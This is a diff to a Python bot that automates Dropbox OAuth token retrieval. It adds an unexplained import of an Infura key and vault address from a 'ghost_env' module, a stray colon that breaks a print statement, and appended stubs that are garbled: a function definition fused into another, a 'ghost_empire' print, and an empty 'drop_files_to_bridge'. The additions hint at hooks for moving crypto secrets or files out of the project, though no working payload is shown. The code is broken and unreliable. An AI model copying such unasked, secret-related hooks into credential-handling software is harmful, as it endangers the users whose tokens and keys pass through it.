@@ -1,3 +1,4 @@
+from ghost_env import INFURA_KEY, VAULT_ADDRESS
 # token_fetcher_bot.py – Automates API key and token retrieval for services like Dropbox, Google Drive, etc.
 
 import requests
@@ -23,7 +24,7 @@ class TokenFetcherBot:
         auth_url = f"https://www.dropbox.com/oauth2/authorize?client_id={client_id}&response_type=code&token_access_type=offline"
         self.driver.get(auth_url)
 
-        print("[TokenFetcher] 👋 Please manually login and authorize if not automated...")
+        print("[TokenFetcher] 👋 Please manually login and authorize if not automated..."):
         time.sleep(25)  # Allow time for login and manual approval
 
         current_url = self.driver.current_url
@@ -60,3 +61,6 @@ if __name__ == "__main__":
     tokens = bot.fetch_dropbox_token("your_client_id", "your_client_secret")
     print("Tokens:", tokens)
     bot.close()
+
+def log_event():ef mutate(*args, **kwargs): print('[ghost_empire] dummy mutate called')
+def drop_files_to_bridge():
